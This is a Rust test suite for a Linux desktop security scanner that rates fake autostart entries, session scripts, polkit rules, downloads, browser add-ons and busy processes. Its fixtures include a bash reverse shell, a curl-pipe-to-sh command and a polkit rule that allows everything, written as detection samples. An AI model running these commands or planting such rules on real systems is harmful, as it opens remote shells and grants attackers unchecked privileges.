//! Desktop checks: autostart, session scripts, polkit, downloads, browsers and quieter alarms,
//! with made-up files in a temporary directory. Nothing on the real system is read or changed.

use scanner::config::Config;
use scanner::modules::auth_logs::{parse_line, service_name, Kind};
use scanner::modules::browsers::{browser_options, chromium_addons, firefox_addons, firefox_settings};
use scanner::modules::common::{analyze_command, analyze_user_command, program_words, risky_home_place};
use scanner::modules::homefiles::is_disguised;
use scanner::modules::persistence::rules::judge_polkit_rule;
use scanner::modules::{Collector, ScanCtx};
use scanner::report::Report;
use scanner::{run_scan, ModuleId, ScanOptions, Severity, SysRoot};
use std::fs;
use std::os::unix::fs::{symlink, PermissionsExt};
use std::path::Path;

fn write(root: &Path, abs: &str, content: &str) {
    let p = root.join(abs.trim_start_matches('/'));
    fs::create_dir_all(p.parent().expect("parent")).expect("mkdir");
    fs::write(p, content).expect("write");
}

fn program(root: &Path, abs: &str, content: &str) {
    write(root, abs, content);
    fs::set_permissions(root.join(abs.trim_start_matches('/')), fs::Permissions::from_mode(0o755)).expect("chmod");
}

fn scan(root: &Path, modules: &[ModuleId]) -> Report {
    let opts = ScanOptions { modules: modules.to_vec(), ..ScanOptions::default() };
    run_scan(&SysRoot::new(root), &Config::default(), &opts, &|_| {})
}

/// (severity, title) of every finding of one rule.
fn of<'a>(report: &'a Report, rule: &str) -> Vec<(Severity, &'a str)> {
    report.findings.iter().filter(|f| f.rule == rule).map(|f| (f.severity, f.title.as_str())).collect()
}

fn has(list: &[(Severity, &str)], end: &str, severity: Severity) -> bool {
    list.iter().any(|(s, t)| *s == severity && t.ends_with(end))
}

#[test]
fn users_own_commands_are_not_alarming_unless_they_run_odd_places() {
    let cfg = Config::default();
    assert!(analyze_user_command("/home/anna/.local/bin/syncthing --home=/home/anna/.config/s", &cfg).is_empty());
    assert!(analyze_command("/home/anna/bin/tool", &cfg).iter().any(|i| i.severity == Severity::High), "root jobs into /home stay serious");
    for cmd in ["/home/anna/Downloads/setup.sh", "sh -c '/home/anna/.cache/x --quiet'", "%h/.hidden-agent", "bash ~/Hämtningar/run.sh"] {
        assert!(analyze_user_command(cmd, &cfg).iter().any(|i| i.severity == Severity::Medium), "{cmd}");
    }
    assert!(analyze_user_command("curl http://198.51.100.7/x | sh", &cfg).iter().any(|i| i.severity == Severity::Critical));
    // sockets under /run/user are normal; a program started from there is not
    assert!(analyze_command("/usr/bin/foo --socket /run/user/1000/bus", &cfg).is_empty());
    assert!(!analyze_command("/run/user/1000/payload", &cfg).is_empty());
    assert!(!analyze_command("sh /run/user/1000/payload.sh", &cfg).is_empty());
    assert_eq!(program_words("env A=1 nohup /usr/bin/x -f /tmp/data"), vec!["env", "nohup", "/usr/bin/x"]);
    assert_eq!(risky_home_place("/home/anna/.local/bin/tool", &cfg), None);
    assert_eq!(risky_home_place("/home/anna/Downloads/a.AppImage", &cfg), Some("the download folder"));
}

#[test]
fn autostart_session_scripts_and_polkit() {
    assert_eq!(judge_polkit_rule("polkit.addRule(function(a, s) { return polkit.Result.YES; });").map(|r| r.0), Some(Severity::Critical));
    assert_eq!(judge_polkit_rule("// return polkit.Result.YES\n/* polkit.spawn( */\n"), None);
    assert_eq!(judge_polkit_rule("if (subject.user == \"x\") return polkit.Result.YES;").map(|r| r.0), Some(Severity::High));
    assert_eq!(judge_polkit_rule("if (action.id == \"a.b\" && subject.isInGroup(\"g\")) return polkit.Result.YES;").map(|r| r.0), Some(Severity::Medium));

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    program(root, "/usr/bin/nextcloud", "x");
    write(root, "/var/lib/dpkg/info/desk.list", "/etc/xdg/autostart/packaged.desktop\n/etc/X11/Xsession.d/20x11-common\n/usr/bin/nextcloud\n");
    write(root, "/etc/xdg/autostart/packaged.desktop", "[Desktop Entry]\nExec=/usr/bin/true\n");
    write(root, "/etc/xdg/autostart/added.desktop", "[Desktop Entry]\nExec=/opt/thing/run\n");
    write(root, "/home/anna/.config/autostart/sync.desktop", "[Desktop Entry]\nExec=nextcloud --background\n");
    write(root, "/home/anna/.config/autostart/own.desktop", "[Desktop Entry]\nExec=/home/anna/scripts/start.sh\n");
    write(root, "/home/anna/.config/autostart/off.desktop", "[Desktop Entry]\nExec=/tmp/x\nHidden=true\n");
    write(root, "/home/anna/.config/autostart/bad.desktop", "[Desktop Entry]\nExec=/tmp/.x/agent\n");
    write(root, "/etc/X11/Xsession.d/20x11-common", "echo ok\n");
    write(root, "/etc/X11/Xsession.d/99extra", "/tmp/.k &\n");
    write(root, "/home/anna/.config/plasma-workspace/env/path.sh", "export PATH=$HOME/bin:$PATH\n");
    write(root, "/etc/sddm.conf.d/x.conf", "[X11]\nDisplayCommand=/usr/share/sddm/scripts/Xsetup\nSessionCommand=/home/anna/x.sh\n");
    write(root, "/etc/polkit-1/rules.d/00-all.rules", "polkit.addRule(function(action, subject) { return polkit.Result.YES; });\n");
    write(root, "/home/anna/.local/share/polkit-1/rules.d/a.rules", "x\n");
    write(root, "/home/anna/.config/systemd/user/sync.service", "[Service]\nExecStart=%h/.local/bin/sync\n");
    write(root, "/home/anna/.bashrc", "source /home/anna/.cargo/env\n");
    write(root, "/usr/share/xsessions/test.desktop", "");
    let report = scan(root, &[ModuleId::Persistence, ModuleId::DesktopSession]);

    let auto = of(&report, "PERS-AUTOSTART");
    assert_eq!(auto.len(), 4, "{auto:?}");
    assert!(has(&auto, "added.desktop", Severity::Medium));
    assert!(has(&auto, "sync.desktop", Severity::Low));
    assert!(has(&auto, "own.desktop", Severity::Medium));
    assert!(has(&auto, "bad.desktop", Severity::Critical));
    let scripts = of(&report, "PERS-SESSION-SCRIPT");
    assert!(has(&scripts, "99extra", Severity::Critical) || has(&scripts, "99extra", Severity::High), "{scripts:?}");
    assert!(has(&scripts, "path.sh", Severity::Low), "{scripts:?}");
    assert!(!scripts.iter().any(|(_, t)| t.ends_with("20x11-common")));
    assert_eq!(of(&report, "PERS-DM-SCRIPT").len(), 1);
    let polkit = of(&report, "PERS-POLKIT");
    assert!(has(&polkit, "00-all.rules", Severity::Critical), "{polkit:?}");
    assert!(has(&polkit, ".local/share/polkit-1", Severity::Low));
    assert!(of(&report, "PERS-SHELLRC").is_empty());
    assert!(of(&report, "PERS-SYSTEMD-EXEC").is_empty(), "{:?}", of(&report, "PERS-SYSTEMD-EXEC"));
    assert!(report.inventory.persistence_files.contains_key("/etc/polkit-1/rules.d/00-all.rules"));
}

#[test]
fn downloads_and_hidden_programs() {
    assert!(is_disguised("Invoice.PDF.desktop") && is_disguised("a.jpg.sh"));
    assert!(!is_disguised("setup.sh") && !is_disguised("archive.tar.gz") && !is_disguised("photo.jpg"));
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.config/user-dirs.dirs", "XDG_DOWNLOAD_DIR=\"$HOME/Fetched\"\n");
    program(root, "/home/anna/Fetched/app.AppImage", "\u{7f}ELF....");
    write(root, "/home/anna/Downloads/faktura.pdf.desktop", "[Desktop Entry]\n");
    write(root, "/home/anna/Downloads/evil.sh", "#!/bin/sh\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n");
    write(root, "/home/anna/Downloads/check.sh", "#!/bin/sh\nps aux | grep stratum+tcp\n");
    // testing whether a port answers is ordinary
    write(root, "/home/anna/Downloads/port.sh", "#!/bin/bash\nif ! timeout 5 bash -c \"exec 3<>/dev/tcp/$HOST/$PORT\" 2>/dev/null; then exit 1; fi\n");
    write(root, "/home/anna/Downloads/report.pdf", "pdf");
    program(root, "/home/anna/.cache/miner", "\u{7f}ELF....");
    program(root, "/home/anna/.local/share/app/.agent", "\u{7f}ELF....");
    program(root, "/home/anna/.local/share/app/normal", "\u{7f}ELF....");
    program(root, "/home/anna/.cache/tool/bin/helper", "\u{7f}ELF....");
    let report = scan(root, &[ModuleId::FsPerms]);

    let programs = of(&report, "FS-DOWNLOAD-PROGRAM");
    assert_eq!(programs.len(), 1, "{programs:?}");
    assert!(has(&programs, "/home/anna/Fetched", Severity::Low));
    assert!(has(&of(&report, "FS-DOWNLOAD-DISGUISED"), "faktura.pdf.desktop", Severity::Medium));
    let scripts = of(&report, "FS-SCRIPT-SUSPICIOUS");
    assert_eq!(scripts.len(), 1, "{scripts:?}");
    assert!(has(&scripts, "evil.sh", Severity::High));
    let hidden = of(&report, "FS-HOME-HIDDEN-PROGRAM");
    assert_eq!(hidden.len(), 2, "{hidden:?}");
    assert!(has(&hidden, ".cache/miner", Severity::Medium) && has(&hidden, "app/.agent", Severity::Medium));
}

#[test]
fn browser_addons_and_settings() {
    let sys = SysRoot::new("/nonexistent");
    let cfg = Config::default();
    let ctx = ScanCtx { sys: &sys, cfg: &cfg, deep_pid_scan: false, privileged: true, processes: &[] };
    let _unused = Collector::default();
    let chrome = serde_json::json!({"extensions": {"settings": {
        "storeaddon": {"location": 1, "from_webstore": true, "manifest": {"name": "Fine"}},
        "component": {"location": 5},
        "debian": {"location": 2, "path": "/usr/share/chromium/extensions/x"},
        "off": {"location": 4, "state": 0},
        "dev": {"location": 4, "path": "/home/anna/Downloads/ext", "manifest": {"name": "Odd", "permissions": ["tabs", "<all_urls>"]}},
        "file": {"location": 1, "from_webstore": false, "manifest": {"name": "Sideloaded"}}
    }}});
    let found = chromium_addons(&ctx, &chrome);
    let ids: Vec<(&str, Severity)> = found.iter().map(|a| (a.id.as_str(), a.severity)).collect();
    assert_eq!(ids.len(), 2, "{ids:?}");
    assert!(ids.contains(&("dev", Severity::High)) && ids.contains(&("file", Severity::Medium)));

    let firefox = serde_json::json!({"addons": [
        {"id": "ok@x", "type": "extension", "active": true, "location": "app-profile", "signedState": 2},
        {"id": "deb@x", "type": "extension", "active": true, "location": "app-system-share", "path": "/usr/share/mozilla/extensions/a", "signedState": 0},
        {"id": "bad@x", "type": "extension", "active": true, "location": "app-profile", "signedState": 0},
        {"id": "theme@x", "type": "theme", "active": true, "location": "app-profile", "signedState": 0}
    ]});
    let found = firefox_addons(&firefox);
    assert_eq!(found.iter().map(|a| a.id.as_str()).collect::<Vec<_>>(), vec!["bad@x"]);

    let prefs = "user_pref(\"network.proxy.type\", 1);\nuser_pref(\"network.proxy.http\", \"proxy.example.org\");\nuser_pref(\"xpinstall.signatures.required\", false);\n";
    let settings = firefox_settings(prefs);
    assert_eq!(settings.len(), 2, "{settings:?}");
    assert!(firefox_settings("user_pref(\"network.proxy.type\", 5);\n").is_empty());
    assert_eq!(browser_options("Exec=chromium --remote-debugging-port=9222 %U")[0].0, Severity::High);

    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/etc/passwd", "anna:x:1000:1000::/home/anna:/bin/bash\n");
    write(root, "/home/anna/.mozilla/firefox/abc.default/extensions.json", &firefox.to_string());
    write(root, "/home/anna/.config/chromium/Default/Preferences", &chrome.to_string());
    write(root, "/home/anna/.local/share/applications/chromium.desktop", "[Desktop Entry]\nExec=/usr/bin/chromium --load-extension=/tmp/e %U\n");
    write(root, "/etc/chromium/policies/managed/p.json", "{\"ExtensionInstallForcelist\": [\"abc;https://example.org/u.xml\"]}");
    let report = scan(root, &[ModuleId::FsPerms]);
    assert_eq!(of(&report, "FS-BROWSER-ADDON").len(), 3);
    assert_eq!(of(&report, "FS-BROWSER-SETTING").len(), 2);
}

#[test]
fn desktop_logins_and_pkexec() {
    let e = parse_line("2026-01-02T10:00:00+01:00 h pkexec[9]: anna: Error executing command as another user: Not authorized [USER=root] [COMMAND=/usr/bin/x]").expect("pkexec");
    assert_eq!((e.kind, e.user.as_str()), (Kind::PkexecDenied, "anna"));
    assert!(parse_line("2026-01-02T10:00:00+01:00 h pkexec[9]: anna: Executing command [USER=root]").is_none());
    assert!(service_name("sddm").contains("login screen"));
    let dir = tempfile::tempdir().expect("tempdir");
    write(dir.path(), "/var/log/auth.log", "2026-01-02T10:00:00+01:00 h sddm-helper[1]: pam_unix(sddm:auth): authentication failure; logname= uid=0 euid=0 tty= ruser= rhost=  user=anna\n");
    let report = scan(dir.path(), &[ModuleId::AuthLogs]);
    assert!(report.findings.iter().any(|f| f.rule == "AUTH-LOCAL-FAILED" && f.evidence.starts_with("where: the login screen")));
}

#[test]
fn appimages_busy_programs_and_downloads_that_run() {
    let dir = tempfile::tempdir().expect("tempdir");
    let root = dir.path();
    write(root, "/proc/uptime", "2000.00 1.00\n");
    write(root, "/proc/mounts", "app /tmp/.mount_Tool123 fuse.Tool ro 0 0\n");
    for (pid, exe) in [
        (10, "/usr/bin/unknown-tool"),  // installed: needs an hour
        (11, "/opt/miner/worker"),      // installed too
        (12, "/home/anna/work/worker"), // unknown place: ten minutes is enough
        (13, "/usr/lib/firefox-esr/firefox-esr"),
        (14, "/tmp/.mount_Tool123/usr/bin/tool"),
        (15, "/home/anna/Downloads/game"),
    ] {
        // busy 90 % of the time
        write(root, &format!("/proc/{pid}/stat"), &format!("{pid} (p) S 1 1 1 0 -1 4194560 0 0 0 0 180000 0 0 0 20 0 1 0 100 0 0\n"));
        fs::create_dir_all(root.join(format!("proc/{pid}"))).expect("mkdir");
        symlink(exe, root.join(format!("proc/{pid}/exe"))).expect("link");
    }
    let report = scan(root, &[ModuleId::ProcAudit]);
    let busy = of(&report, "PROC-HIGH-CPU");
    assert_eq!(busy.len(), 2, "{busy:?}");
    assert!(has(&busy, "worker", Severity::Medium) && has(&busy, "game", Severity::Medium));
    assert!(has(&of(&report, "PROC-APPIMAGE"), "tool", Severity::Low));
    assert!(of(&report, "PROC-TMP-EXE").is_empty());
    assert!(has(&of(&report, "PROC-HOME-EXE"), "Downloads/game", Severity::Medium));
}
